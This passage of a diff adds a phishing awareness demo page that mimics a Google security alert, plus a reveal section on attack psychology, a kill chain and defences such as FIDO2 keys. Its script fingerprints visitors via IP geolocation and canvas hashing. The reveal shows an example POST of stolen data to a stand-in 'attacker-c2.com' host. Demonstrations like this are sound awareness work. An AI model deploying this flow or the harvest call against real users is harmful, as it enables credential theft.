+    <span>English (United States)</span>
+    <nav><a href="#">Help</a><a href="#">Privacy</a><a href="#">Terms</a></nav>
+  </footer>
+</div>
+
+
+<!-- ══════════════════════════════════════════════════════════════════════
+     PAGE 3 — SECURITY AWARENESS REVEAL
+     ══════════════════════════════════════════════════════════════════════ -->
+<div id="page-reveal" class="hidden">
+
+  <div class="reveal-banner">
+    <span class="stop-icon">🛑</span>
+    <h1>You Just Completed a 3-Stage Phishing Attack</h1>
+    <p>
+      This is a <strong>non-functional security awareness demonstration</strong> by DanG Security.
+      Nothing was collected or transmitted at any stage. But walk through what just happened —
+      because it's more disturbing than it sounds.
+    </p>
+    <div class="stage-pills">
+      <span class="stage-pill">Stage 1 · Urgency &amp; Email Confirmation</span>
+      <span class="stage-pill">Stage 2 · False Authority via Fake Logs</span>
+      <span class="stage-pill">Stage 3 · You Are Here</span>
+    </div>
+  </div>
+
+  <div class="reveal-content">
+
+    <!-- 1. COLLECTED DATA -->
+    <div class="rcard">
+      <div class="rcard-head">
+        <span class="icon">🕵️</span>
+        <h2>What Was Collected — Before You Clicked Anything</h2>
+        <span class="chip">Passive · No consent required</span>
+      </div>
+      <div class="rcard-body">
+        <p class="section-intro">
+          The data below was collected the instant your browser loaded this page —
+          before any form interaction, before any button click. This is standard browser API
+          exposure available to every website. A real attacker uses this data to pre-populate
+          the "access logs" on page 2 with your actual browser and OS, making the familiar
+          entries feel unmistakably like <em>your</em> account history.
+        </p>
+        <div class="data-grid">
+          <div class="dtile"><div class="dtile-label">IP Address</div><div class="dtile-value pending" id="d-ip">Fetching…</div></div>
+          <div class="dtile"><div class="dtile-label">City</div><div class="dtile-value pending" id="d-city">Fetching…</div></div>
+          <div class="dtile"><div class="dtile-label">Region / State</div><div class="dtile-value pending" id="d-region">Fetching…</div></div>
+          <div class="dtile"><div class="dtile-label">Country</div><div class="dtile-value pending" id="d-country">Fetching…</div></div>
+          <div class="dtile"><div class="dtile-label">ISP / Organization</div><div class="dtile-value pending" id="d-org">Fetching…</div></div>
+          <div class="dtile"><div class="dtile-label">Approx. Coordinates</div><div class="dtile-value pending" id="d-coords">Fetching…</div></div>
+          <div class="dtile"><div class="dtile-label">Timezone</div><div class="dtile-value" id="d-tz">—</div></div>
+          <div class="dtile"><div class="dtile-label">Browser</div><div class="dtile-value" id="d-browser">—</div></div>
+          <div class="dtile"><div class="dtile-label">Operating System</div><div class="dtile-value" id="d-os">—</div></div>
+          <div class="dtile"><div class="dtile-label">Screen Resolution</div><div class="dtile-value" id="d-screen">—</div></div>
+          <div class="dtile"><div class="dtile-label">CPU Threads</div><div class="dtile-value" id="d-cpu">—</div></div>
+          <div class="dtile"><div class="dtile-label">Device Memory</div><div class="dtile-value" id="d-mem">—</div></div>
+          <div class="dtile"><div class="dtile-label">Language</div><div class="dtile-value" id="d-lang">—</div></div>
+          <div class="dtile"><div class="dtile-label">Touch Screen</div><div class="dtile-value" id="d-touch">—</div></div>
+          <div class="dtile"><div class="dtile-label">Do Not Track</div><div class="dtile-value" id="d-dnt">—</div></div>
+          <div class="dtile"><div class="dtile-label">Connection Type</div><div class="dtile-value" id="d-conn">—</div></div>
+          <div class="dtile"><div class="dtile-label">Canvas Fingerprint</div><div class="dtile-value pending" id="d-canvas">Computing…</div></div>
+          <div class="dtile"><div class="dtile-label">Visit Timestamp</div><div class="dtile-value" id="d-ts">—</div></div>
+        </div>
+      </div>
+    </div>
+
+    <!-- 2. PSYCHOLOGY -->
+    <div class="rcard">
+      <div class="rcard-head">
+        <span class="icon">🧠</span>
+        <h2>The Psychology — Why This Works on Smart, Careful People</h2>
+      </div>
+      <div class="rcard-body">
+        <p class="section-intro">
+          Each stage of what you just experienced was engineered to exploit a specific,
+          well-documented cognitive principle. These aren't tricks for the gullible —
+          they are techniques that consistently work on security professionals,
+          IT administrators, and executives. Understanding the mechanics is the only defense.
+        </p>
+        <div class="psych-grid">
+          <div class="psych-tile">
+            <div class="mechanic-label">Stage 1 · Urgency</div>
+            <h3>System 1 Override</h3>
+            <p>Urgency and fear suppress the prefrontal cortex's deliberate reasoning ("System 2") and activate the faster, pattern-matching amygdala response ("System 1"). The goal isn't to fool your logic — it's to prevent your logic from activating at all. "Someone in Nigeria is in your account right now" is designed to make you act before you think.</p>
+          </div>
+          <div class="psych-tile">
+            <div class="mechanic-label">Stage 1 · Authority</div>
+            <h3>Institutional Impersonation</h3>
+            <p>Google's own logo, loaded from Google's own CDN, on a URL that says google.com in the address bar, with a valid Google TLS certificate. Every visual and technical trust signal your brain uses to evaluate legitimacy was present. The page <em>is</em> hosted by Google. There was no lie to detect on those dimensions.</p>
+          </div>
+          <div class="psych-tile">
+            <div class="mechanic-label">Stage 2 · False Authority</div>
+            <h3>The Privileged Data Illusion</h3>
+            <p>When you saw a table of access logs containing your real browser, your real operating system, and an approximate version of your location — you thought "they have my data." That belief established that this page has administrative access to your account. In reality, the "familiar" rows were fabricated from the browser fingerprint passively collected when you first loaded the page.</p>
+          </div>
+          <div class="psych-tile">
+            <div class="mechanic-label">Stage 2 · Commitment</div>
+            <h3>Foot-in-the-Door</h3>
+            <p>Checking boxes on the log table was a small, low-stakes action. But it was an action — a commitment. Cialdini's consistency principle predicts that once people make a small commitment, they're significantly more likely to make a larger, consistent one. You already participated in the security review. Now "confirm your recovery email" or "re-enter your password on the next step" feels like the natural completion of something you already started.</p>
+          </div>
+          <div class="psych-tile">
+            <div class="mechanic-label">Stage 2 · Anchoring</div>
+            <h3>Credibility by Contrast</h3>
+            <p>The log table showed mostly legitimate-looking entries, with only 2 pre-flagged suspicious ones. The ratio matters: a table of all-suspicious entries would look fabricated. The mix of familiar and suspicious anchors the viewer's belief that the system is real — because a fake system would just show the attack, not all the normal usage history around it.</p>
+          </div>
+          <div class="psych-tile">
+            <div class="mechanic-label">Stage 2 · Reciprocity</div>
+            <h3>The Implied Debt</h3>
+            <p>By "giving you" your security logs and alerting you to the threat, the attacker created an implicit social contract: they did something for you, now you owe them cooperation. The ask to "confirm a few details" on the next step feels like a fair exchange for the protective service you just received. This is why the most sophisticated phishing doesn't just steal — it <em>helps first</em>.</p>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- 3. CODE BOX -->
+    <div class="rcard">
+      <div class="rcard-head">
+        <span class="icon">💻</span>
+        <h2>The Code That Personalized the Logs — Using Your Own Data Against You</h2>
+      </div>
+      <div class="rcard-body">
+        <p class="section-intro">
+          The "familiar" rows in the access log table weren't pulled from a database.
+          They were generated client-side using data your browser volunteered
+          the moment the page loaded. Here's how the fabrication works.
+        </p>
+        <div class="code-wrap">
+          <div class="code-toolbar">
+            <div class="dots">
+              <div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div>
+            </div>
+            <span>generate-fake-logs.js</span>
+          </div>
+          <div class="code-block">
+<span class="c-cm">// ── Step 1: Collect passive fingerprint on page 1 load ───────────────</span>
+<span class="c-cm">// Runs silently before the victim interacts with anything.</span>
+
+<span class="c-kw">const</span> <span class="c-nm">geo</span>     = <span class="c-kw">await</span> <span class="c-fn">fetch</span>(<span class="c-st">'https://ipapi.co/json/'</span>).<span class="c-fn">then</span>(<span class="c-nm">r</span> =&gt; <span class="c-nm">r</span>.<span class="c-fn">json</span>());
+<span class="c-kw">const</span> <span class="c-nm">ua</span>      = <span class="c-fn">navigator</span>.<span class="c-nm">userAgent</span>;       <span class="c-cm">// "Chrome/124 on Windows 10"</span>
+<span class="c-kw">const</span> { <span class="c-nm">browser</span>, <span class="c-nm">os</span> } = <span class="c-fn">parseUA</span>(<span class="c-nm">ua</span>);     <span class="c-cm">// parsed browser + OS strings</span>
+
+<span class="c-cm">// ── Step 2: Fabricate log rows that feel like the victim's real history</span>
+<span class="c-kw">function</span> <span class="c-fn">generateLogs</span>(<span class="c-nm">geo</span>, <span class="c-nm">browser</span>, <span class="c-nm">os</span>) {
+  <span class="c-kw">const</span> <span class="c-nm">city</span> = <span class="c-nm">geo</span>?.<span class="c-nm">city</span> || <span class="c-st">'Your Location'</span>;
+  <span class="c-kw">const</span> <span class="c-nm">rgn</span>  = <span class="c-nm">geo</span>?.<span class="c-nm">region_code</span> || <span class="c-st">''</span>;
+
+  <span class="c-kw">return</span> [
+    <span class="c-cm">// Suspicious rows — pre-checked, blatantly foreign</span>
+    { <span class="c-nm">device</span>: <span class="c-st">'Unknown Windows PC'</span>, <span class="c-nm">location</span>: <span class="c-st">'Lagos, Nigeria 🇳🇬'</span>,  <span class="c-nm">status</span>: <span class="c-st">'blocked'</span>,  <span class="c-nm">checked</span>: <span class="c-kw">true</span>  },
+    { <span class="c-nm">device</span>: <span class="c-st">'Chrome on Windows'</span>,   <span class="c-nm">location</span>: <span class="c-st">'Moscow, Russia 🇷🇺'</span>,   <span class="c-nm">status</span>: <span class="c-st">'unknown'</span>,  <span class="c-nm">checked</span>: <span class="c-kw">true</span>  },
+
+    <span class="c-cm">// "Familiar" rows — built from the victim's own fingerprint data</span>
+    <span class="c-cm">// `browser` and `os` come from navigator.userAgent, parsed above.</span>
+    <span class="c-cm">// `city` and `rgn` come from the passive IP geolocation fetch.</span>
+    <span class="c-cm">// To the victim: "That's MY browser on MY OS in MY city — this is real."</span>
+    { <span class="c-nm">device</span>: <span class="c-op">`${</span><span class="c-nm">browser</span><span class="c-op">} on ${</span><span class="c-nm">os</span><span class="c-op">}`</span>, <span class="c-nm">location</span>: <span class="c-op">`${</span><span class="c-nm">city</span><span class="c-op">}, ${</span><span class="c-nm">rgn</span><span class="c-op">}`</span>, <span class="c-nm">status</span>: <span class="c-st">'verified'</span>, <span class="c-nm">checked</span>: <span class="c-kw">false</span> },
+    { <span class="c-nm">device</span>: <span class="c-op">`${</span><span class="c-nm">browser</span><span class="c-op">} on ${</span><span class="c-nm">os</span><span class="c-op">}`</span>, <span class="c-nm">location</span>: <span class="c-op">`${</span><span class="c-nm">city</span><span class="c-op">}, ${</span><span class="c-nm">rgn</span><span class="c-op">}`</span>, <span class="c-nm">status</span>: <span class="c-st">'verified'</span>, <span class="c-nm">checked</span>: <span class="c-kw">false</span> },
+    <span class="c-cm">// ...more entries to fill out the table</span>
+  ];
+}
+
+<span class="c-cm">// ── What a real attacker does after "Report Selected Activity" ────────</span>
+<span class="c-cm">// The button click is the foot-in-the-door commitment.
+// The "next step" would ask for:</span>
+<span class="c-hl"><span class="c-kw">await</span> <span class="c-fn">fetch</span>(<span class="c-st">'https://attacker-c2.com/harvest'</span>, {
+  <span class="c-nm">method</span>: <span class="c-st">'POST'</span>,
+  <span class="c-nm">body</span>: <span class="c-fn">JSON</span>.<span class="c-fn">stringify</span>({
+    ...fingerprint,                            <span class="c-cm">// everything from page 1</span>
+    <span class="c-nm">email</span>: document.<span class="c-fn">getElementById</span>(<span class="c-st">'fake-email'</span>).<span class="c-nm">value</span>,
+    <span class="c-cm">// + step 3 asks for password, recovery phone, or 2FA code</span>
+    <span class="c-cm">// + victim complies because they already "started the process"</span>
+  })
+});</span>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- 4. URL ANALYSIS -->
+    <div class="rcard">
+      <div class="rcard-head">
+        <span class="icon">🔗</span>
+        <h2>URL Analysis — Why Your Browser's Padlock Didn't Save You</h2>
+      </div>
+      <div class="rcard-body">
+        <p class="section-intro">
+          The padlock was green. The domain read <strong>google.com</strong>.
+          Zero browser warnings. Here's what was verified — and what wasn't.
+        </p>
+        <div class="url-compare">
+          <div class="url-box legit">
+            <div class="url-box-head">✅ Legitimate Google Account Page</div>
+            <div class="url-box-body">
+              <span class="hl-g">https://</span><span class="hl-g">accounts.google.com</span>/signin/v2/identifier<br>
+              <br>
+              Domain: <span class="hl-g">accounts.google.com</span><br>
+              Path controlled by: <span class="hl-g">Google LLC</span><br>
+              TLS cert: <span class="hl-g">google.com ✓</span><br>
+              Hosting: <span class="hl-g">Google infrastructure</span>
+            </div>
+          </div>
+          <div class="url-box phish">
+            <div class="url-box-head">🎣 This Demo (same infra, attacker-controlled)</div>
+            <div class="url-box-body">
+              <span class="hl-g">https://</span><span class="hl-g">sites.google.com</span>/<span class="hl-r">view/access-logs</span><br>
+              <br>
+              Domain: <span class="hl-g">sites.google.com</span><br>
+              Path controlled by: <span class="hl-r">the attacker</span><br>
+              TLS cert: <span class="hl-g">google.com ✓</span> (still valid!)<br>
+              Hosting: <span class="hl-g">Google infrastructure</span>
+            </div>
+          </div>
+        </div>
+        <div class="url-callout">
+          <strong>The slug <code>/view/access-logs</code> was unclaimed.</strong>
+          There is no vetting, no review, and no reservation process. Any anonymous person
+          can claim any available slug on <code>sites.google.com/view/</code> for free, permanently,
+          using a throwaway Gmail account. The resulting URL passes every domain-reputation scanner
+          because the domain is genuinely google.com — hosted on Google's own CDN with Google's own TLS certificate.
+        </div>
+      </div>
+    </div>
+
+    <!-- 5. ATTACK ANATOMY -->
+    <div class="rcard">
+      <div class="rcard-head">
+        <span class="icon">⚔️</span>
+        <h2>Attack Anatomy — The Full Kill Chain</h2>
+      </div>
+      <div class="rcard-body">
+        <div class="steps">
+          <div class="step">
+            <div class="step-num">1</div>
+            <div class="step-body">
+              <strong>Attacker creates a free throwaway Gmail account</strong>
+              <p>4 minutes. $0. No identity verification. The <code>/view/</code> prefix is exclusive to personal Gmail — not Workspace. Ironically it produces a URL that looks more like an internal Google property than the Workspace equivalent which embeds your org domain.</p>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">2</div>
+            <div class="step-body">
+              <strong>Claims a high-trust slug — no review, no waitlist</strong>
+              <p><code>/view/access-logs</code>, <code>/view/security-alert</code>, <code>/view/account-recovery</code> — first come, first served. Permanently. For free. The slug is the entire attack surface. Once claimed it cannot be removed without a Google manual intervention.</p>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">3</div>
+            <div class="step-body">
+              <strong>Builds the phishing flow in Google Sites</strong>
+              <p>No-code WYSIWYG builder. Copies Google's fonts, colors, layout. Embeds Google's own logo assets loaded from <code>gstatic.com</code> — so resource requests in proxy logs look like Google talking to Google. Hosts a passive fingerprinting script to collect geo, browser, and device data on page load.</p>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">4</div>
+            <div class="step-body">
+              <strong>Delivers via spear-phishing email</strong>
+              <p>Urgent "Critical Security Alert" email — Google-branded, possibly sent via a Google product (Forms, Calendar invite, Docs share) for added legitimacy. The embedded link is a real google.com URL, so it passes SafeLinks, Proofpoint, and any URL scanner relying on domain reputation.</p>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num red">5</div>
+            <div class="step-body">
+              <strong>Stage 2 deploys the privileged data illusion</strong>
+              <p>Using the passively collected browser fingerprint and geolocation data, the attacker generates a fake access log table populated with the victim's real browser, OS, and approximate city. The victim sees their own data reflected back and concludes the page has administrative access to their account. This is the moment trust transfers completely.</p>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num red">6</div>
+            <div class="step-body">
+              <strong>Victim makes their first commitment</strong>
+              <p>Selecting and submitting "unrecognized" log entries is a low-friction action, but it's a commitment. The victim has now actively participated in the security process. Cialdini's consistency principle means subsequent asks — confirm your password, enter your recovery phone, provide the 2FA code — feel like logical continuations of something already in progress.</p>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num red">7</div>
+            <div class="step-body">
+              <strong>Harvests credentials via AiTM proxy or direct collection</strong>
+              <p>Against SMS or TOTP-based 2FA, an Adversary-in-the-Middle proxy relays credentials to the real Google in real time, stealing the authenticated session cookie before 2FA can stop it. Against accounts with hardware keys (FIDO2/passkeys), this attack chain fails at this step — the key will not authenticate to a non-canonical origin.</p>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num red">8</div>
+            <div class="step-body">
+              <strong>Account takeover and silent redirect</strong>
+              <p>With a valid session cookie, the attacker has full account access. The victim is silently redirected to the real <code>myaccount.google.com</code> — which looks like "the verification worked." From here: email exfiltration, OAuth app persistence for long-term access, lateral movement to any SSO-connected application, or credential resale.</p>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- 6. DEFENSE -->
+    <div class="rcard">
+      <div class="rcard-head">
+        <span class="icon">🛡️</span>
+        <h2>How to Not Become a Statistic</h2>
+      </div>
+      <div class="rcard-body">
+        <ul class="protect-list">
+          <li class="protect-item">
+            <span class="protect-icon">🔑</span>
+            <div>
+              <h3>FIDO2 hardware keys or passkeys — the only phishing-resistant 2FA</h3>
+              <p>Hardware keys (YubiKey, Google Titan) and device passkeys cryptographically bind authentication to the exact origin. They will not authenticate a session on <code>sites.google.com</code> for credentials stored for <code>accounts.google.com</code>. SMS OTPs and TOTP codes do not have this property — they are relayed by an AiTM proxy in real time.</p>
+            </div>
+          </li>
+          <li class="protect-item">
+            <span class="protect-icon">🔒</span>
+            <div>
+              <h3>Google's Advanced Protection Program</h3>
+              <p>Requires two hardware keys. Enforces stricter OAuth app restrictions and account recovery controls. For high-value targets — executives, security professionals, journalists — this is non-negotiable. Enrollment at <code>landing.google.com/advancedprotection</code>.</p>
+            </div>
+          </li>
+          <li class="protect-item">
+            <span class="protect-icon">🧩</span>
+            <div>
+              <h3>Use a password manager — it knows what your eyes miss</h3>
+              <p>Password managers bind credential autofill to the exact origin. They will not autofill <code>sites.google.com</code> with credentials saved for <code>accounts.google.com</code>. If your password manager hesitates, your brain should stop completely.</p>
+            </div>
+          </li>
+          <li class="protect-item">
+            <span class="protect-icon">🔍</span>
+            <div>
+              <h3>Read the full URL path — not just the domain name</h3>
+              <p>Google's authentication lives at <code>accounts.google.com</code>. If you're asked to log in under any other google.com path, treat it as compromised until proven otherwise. The padlock certifies the <em>domain</em>. It says nothing about who controls the <em>page</em>.</p>
+            </div>
+          </li>
+          <li class="protect-item">
+            <span class="protect-icon">🚨</span>
+            <div>
+              <h3>Urgency is the attacker's primary weapon</h3>
+              <p>The engineering of fear and time pressure is deliberate. Google's genuine security alerts direct you to <code>myaccount.google.com/security</code> directly — they do not embed login forms or access logs in linked pages. Navigate there manually. Never via a link in an alert.</p>
+            </div>
+          </li>
+          <li class="protect-item">
+            <span class="protect-icon">📋</span>
+            <div>
+              <h3>Recognize the commitment trap</h3>
+              <p>If you've already taken a small action on a page (checked boxes, confirmed an email, answered a question), notice that you've been primed. The natural instinct is to continue — because stopping feels inconsistent with what you just did. Stop anyway. Consistency is a feature of trustworthy behavior, not a reason to ignore warning signs.</p>
+            </div>
+          </li>
+        </ul>
+      </div>
+    </div>
+
+  </div>
+
+  <footer class="attrib">
+    Security Awareness Demonstration · <a href="https://dangsecurity.com" target="_blank" rel="noopener">DanG Security</a><br>
+    No data was collected, stored, or transmitted at any point during this demonstration.<br>
+    <code>https://sites.google.com/view/access-logs</code> · Built to prove a point, not to cause harm.
+  </footer>
+
+</div>
+
+
+<script>
+  // ─── Global state ─────────────────────────────────────────────────────────
+  let geoData   = null;   // fetched silently on page load
+  let enteredEmail = '';  // captured from page 1 field for page 2 display only
+
+  // ─── Begin passive fingerprint collection immediately ────────────────────
+  // NOTE FOR LOCAL TESTING: Opening this file via file:// may cause this fetch
+  // to fail silently due to browser mixed-content / CORS restrictions.
+  // Host on HTTPS (GitHub Pages, etc.) for the IP/geo features to work.
+  // All other features (log table, fingerprint display, page transitions) work locally.
+  (async function initPassive() {
+    try {
+      const r = await fetch('https://ipapi.co/json/');
+      if (!r.ok) throw new Error(`HTTP ${r.status} — likely rate-limited (1000 req/day free tier)`);
+      const data = await r.json();
+      if (data.error) throw new Error(data.reason || 'API returned error');
+      geoData = data;
+    } catch (e) {
+      geoData = null;
+      const isLocal = location.protocol === 'file:';
+      console.info(
+        '%c[DanG Security Demo] IP geolocation unavailable',
+        'color:#d93025;font-weight:bold',
+        '\nReason:', e.message,
+        isLocal ? '\n→ You are running via file:// — host on HTTPS for full functionality.' : ''
+      );
+    }
+  })();
+
+  // ─── Page 1: fake timestamp ───────────────────────────────────────────────
+  (function () {
+    const d = new Date();
+    d.setMinutes(d.getMinutes() - Math.floor(Math.random() * 10 + 3));
+    const el = document.getElementById('fake-time');
+    if (el) el.textContent = d.toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit' }) + ' today';
+  })();
+
+  // ─── UA parsing ──────────────────────────────────────────────────────────
+  function parseUA(ua) {
+    let browser = 'Web Browser', os = 'Unknown OS';
+
+    if      (/Edg\//.test(ua))              browser = 'Microsoft Edge '  + (ua.match(/Edg\/([\d]+)/)?.[1]     || '');
+    else if (/OPR\//.test(ua))              browser = 'Opera '           + (ua.match(/OPR\/([\d]+)/)?.[1]     || '');
+    else if (/Firefox\//.test(ua))          browser = 'Firefox '         + (ua.match(/Firefox\/([\d]+)/)?.[1] || '');
+    else if (/Chrome\//.test(ua))           browser = 'Chrome '          + (ua.match(/Chrome\/([\d]+)/)?.[1]  || '');
+    else if (/Version\/.*Safari/.test(ua))  browser = 'Safari '          + (ua.match(/Version\/([\d]+)/)?.[1] || '');
+
+    if      (/Windows NT 10|Windows NT 11/.test(ua)) os = 'Windows 10/11';
+    else if (/Windows NT 6\.3/.test(ua))             os = 'Windows 8.1';
+    else if (/Mac OS X/.test(ua))                    os = 'macOS ' + (ua.match(/Mac OS X ([\d_]+)/)?.[1]?.replace(/_/g, '.') || '');
+    else if (/Android/.test(ua))                     os = 'Android ' + (ua.match(/Android ([\d.]+)/)?.[1] || '');
+    else if (/iPhone|iPad/.test(ua))                 os = 'iOS ' + (ua.match(/OS ([\d_]+)/)?.[1]?.replace(/_/g, '.') || '');
+    else if (/Linux/.test(ua))                       os = 'Linux';
+    else if (/CrOS/.test(ua))                        os = 'ChromeOS';
+
+    return { browser: browser.trim(), os: os.trim() };
+  }
+
+  // ─── Canvas fingerprint ───────────────────────────────────────────────────
+  function getCanvasFingerprint() {
+    try {
+      const c = document.createElement('canvas');
+      c.width = 240; c.height = 60;
+      const ctx = c.getContext('2d');
+      ctx.beginPath(); ctx.moveTo(20, 20); ctx.lineTo(220, 20); ctx.lineTo(220, 50); ctx.closePath();
+      ctx.fillStyle = 'rgba(102,204,0,0.7)'; ctx.fill();
+      ctx.textBaseline = 'top';
+      ctx.font = '600 14px Arial';
+      ctx.fillStyle = '#069';
+      ctx.fillText('DanG Security \uD83D\uDD0D 2025', 6, 6);
+      ctx.fillStyle = 'rgba(255,0,120,0.5)';
+      ctx.fillText('DanG Security \uD83D\uDD0D 2025', 8, 8);
+      const raw = c.toDataURL();
+      let h = 0x811c9dc5;
+      for (let i = 0; i < raw.length; i++) { h ^= raw.charCodeAt(i); h = Math.imul(h, 0x01000193); }
+      return '0x' + (h >>> 0).toString(16).toUpperCase().padStart(8, '0');
+    } catch (_) { return 'canvas-blocked'; }
+  }
+
+  // ─── Generate fake log rows ───────────────────────────────────────────────
+  function generateLogs() {
+    const { browser, os } = parseUA(navigator.userAgent);
+    const city    = geoData?.city        || 'Your Location';
+    const rgn     = geoData?.region_code || '';
+    const realIP  = geoData?.ip          || null;
+    const userLoc = city + (rgn ? ', ' + rgn : '');
+    const flag    = geoData?.country === 'GB' ? '🇬🇧' :
+                    geoData?.country === 'CA' ? '🇨🇦' :
+                    geoData?.country === 'AU' ? '🇦🇺' :
+                    geoData?.country === 'DE' ? '🇩🇪' :
+                    geoData?.country === 'FR' ? '🇫🇷' :
+                    geoData?.country === 'JP' ? '🇯🇵' : '🇺🇸';
+
+    const now = Date.now();
+    const MIN = 60 * 1000, HR = 60 * MIN, DAY = 24 * HR;
+    const deviceLabel = `${browser} on ${os}`;
+    const myIP = realIP || '(IP unavailable — see note)';
+
+    // jitter(base, spread) — adds random variance so timestamps look organic
+    // rather than suspiciously round (exactly 2 hr, 7 hr, 4 day, etc.).
+    // Moscow's range (3.9–4.7 days) is intentionally non-overlapping with its
+    // neighbours (3 ± 6 hr  and  6 ± 12 hr) so the sort always places it correctly.
+    const jitter = (base, spread) =>
+      new Date(now - base + (Math.random() - 0.5) * 2 * spread);
+
+    const rows = [
+      // Blocked attempt — minutes ago, what triggered the alert
+      { ts: jitter(47   * MIN,  8   * MIN), device: 'Unknown Windows PC',   browser: 'Chrome 124', location: 'Lagos, Nigeria 🇳🇬',  method: 'Google Drive',   ip: '197.210.84.26', status: 'blocked',  checked: false },
+      // Familiar recent activity — real browser / OS / IP from passive collection
+      { ts: jitter(2    * HR,   25  * MIN), device: deviceLabel,            browser: browser,      location: userLoc + ' ' + flag,  method: 'Chrome browser', ip: myIP,            status: 'verified', checked: false },
+      { ts: jitter(7    * HR,   40  * MIN), device: deviceLabel,            browser: browser,      location: userLoc + ' ' + flag,  method: 'Google Drive',   ip: myIP,            status: 'verified', checked: false },
+      { ts: jitter(22   * HR,   2   * HR),  device: 'Mobile device',        browser: 'Google app', location: userLoc + ' ' + flag,  method: 'Gmail app',      ip: myIP,            status: 'verified', checked: false },
+      { ts: jitter(3    * DAY,  6   * HR),  device: deviceLabel,            browser: browser,      location: userLoc + ' ' + flag,  method: 'Chrome browser', ip: myIP,            status: 'verified', checked: false },
+      // The unrecognized event — API token access, no verdict given
+      { ts: jitter(4.3  * DAY,  0.4 * DAY), device: 'Chrome on Windows 11', browser: 'Chrome 122', location: 'Moscow, Russia 🇷🇺',  method: 'API token',      ip: '95.108.213.44', status: 'unknown',  checked: false },
+      // Older familiar history
+      { ts: jitter(6    * DAY,  12  * HR),  device: 'Chrome on macOS',      browser: 'Chrome 123', location: userLoc + ' ' + flag,  method: 'Google Account', ip: myIP,            status: 'verified', checked: false },
+      { ts: jitter(10   * DAY,  18  * HR),  device: deviceLabel,            browser: browser,      location: userLoc + ' ' + flag,  method: 'Chrome browser', ip: myIP,            status: 'verified', checked: false },
+      { ts: jitter(15   * DAY,  1   * DAY), device: 'Mobile device',        browser: 'Google app', location: userLoc + ' ' + flag,  method: 'Gmail app',      ip: myIP,            status: 'verified', checked: false },
+      { ts: jitter(23   * DAY,  1.5 * DAY), device: deviceLabel,            browser: browser,      location: userLoc + ' ' + flag,  method: 'Chrome browser', ip: myIP,            status: 'verified', checked: false },
+    ];
+
+    // Sort newest-first — chronological order is guaranteed by the sort,
+    // not by array declaration order. Moscow always falls between its neighbours.
+    return rows.sort((a, b) => b.ts - a.ts);
+  }
+
+  // ─── Render log table ─────────────────────────────────────────────────────
+  let logRows = [];
+
+  function formatTime(date) {
+    const now = Date.now();
+    const diff = now - date.getTime();
+    const MIN = 60000, HR = 3600000, DAY = 86400000;
+
+    if (diff < HR)  return `<span>${Math.round(diff/MIN)} min ago</span>`;
+    if (diff < DAY) return `<span>${Math.round(diff/HR)} hr ago</span>`;
+    const d = date.toLocaleDateString('en-US', { month: 'short', day: 'numeric' });
+    const t = date.toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit' });
+    return `<span>${d}</span><div class="date">${t}</div>`;
+  }
+
+  function renderLogs() {
+    logRows = generateLogs();
+    const tbody = document.getElementById('logs-tbody');
+    if (!tbody) return;
+
+    tbody.innerHTML = logRows.map(function(row, i) {
+      const badge = row.status === 'verified'
+        ? '<span class="badge badge-verified">✓ Verified</span>'
+        : row.status === 'blocked'
+        ? '<span class="badge badge-blocked">🚫 Blocked</span>'
+        : '<span class="badge badge-unknown">⚠ Unrecognized</span>';
+
+      const trClass = (row.status === 'blocked' || row.status === 'unknown') ? ' class="suspicious-row"' : '';
+
+      return `<tr${trClass}>
+        <td data-label="Select"><input type="checkbox" class="log-checkbox" data-idx="${i}" ${row.checked ? 'checked' : ''} onchange="updateCount()"></td>
+        <td data-label="Time"><div class="log-time">${formatTime(row.ts)}</div></td>
+        <td data-label="Device"><div class="log-device">${row.device}<div class="sub">${row.browser}</div></div></td>
+        <td data-label="Location" class="log-location">
+          <div>${row.location}</div>
+          <div class="log-ip">${row.ip}</div>
+        </td>
+        <td data-label="Method" style="color:var(--g-sub)">${row.method}</td>
+        <td data-label="Status">${badge}</td>
+      </tr>`;
+    }).join('');
+
+    updateCount();
+  }
+
+  function updateCount() {
+    const boxes = document.querySelectorAll('.log-checkbox');
+    let n = 0;
+    boxes.forEach(function(b) { if (b.checked) n++; });
+    const el = document.getElementById('sel-count');
+    if (el) el.textContent = n + ' event' + (n !== 1 ? 's' : '');
+  }
+
+  function selectNone() {
+    document.querySelectorAll('.log-checkbox').forEach(function(b) { b.checked = false; });
+    updateCount();
+  }
+
+  // ─── Page transitions ─────────────────────────────────────────────────────
+  function showLoading(msg, duration, cb) {
+    document.getElementById('loading-msg').textContent = msg;
+    document.getElementById('loading-overlay').classList.remove('hidden');
+    setTimeout(function() {
+      document.getElementById('loading-overlay').classList.add('hidden');
+      cb();
+      window.scrollTo({ top: 0, behavior: 'instant' });
+    }, duration);
+  }
+
+  function showAccessLogs() {
+    enteredEmail = document.getElementById('fake-email').value.trim() || 'user@gmail.com';
+
+    // Populate account chip
+    const avatar = document.getElementById('account-avatar');
+    const emailEl = document.getElementById('account-email-display');
+    if (avatar)  avatar.textContent  = enteredEmail[0].toUpperCase();
+    if (emailEl) emailEl.textContent = enteredEmail;
+
+    showLoading('Retrieving account activity…', 2200, function() {
+      document.getElementById('page-phish').classList.add('hidden');
+      document.getElementById('page-logs').classList.remove('hidden');
+      renderLogs();
+    });
+  }
+
+  function triggerReveal() {
+    showLoading('Submitting report to Google Security…', 1800, function() {
+      document.getElementById('page-logs').classList.add('hidden');
+      document.getElementById('page-reveal').classList.remove('hidden');
+      collectAndDisplay();
+    });
+  }
+
+  // ─── Reveal page data display ─────────────────────────────────────────────
+  function set(id, val) {
+    const el = document.getElementById(id);
+    if (!el) return;
+    el.textContent = val || 'N/A';
+    el.classList.remove('pending');
+  }
+
+  async function collectAndDisplay() {
+    set('d-ts', new Date().toLocaleString('en-US', { dateStyle: 'medium', timeStyle: 'medium' }));
+    set('d-tz', Intl.DateTimeFormat().resolvedOptions().timeZone);
+
+    const ua = navigator.userAgent;
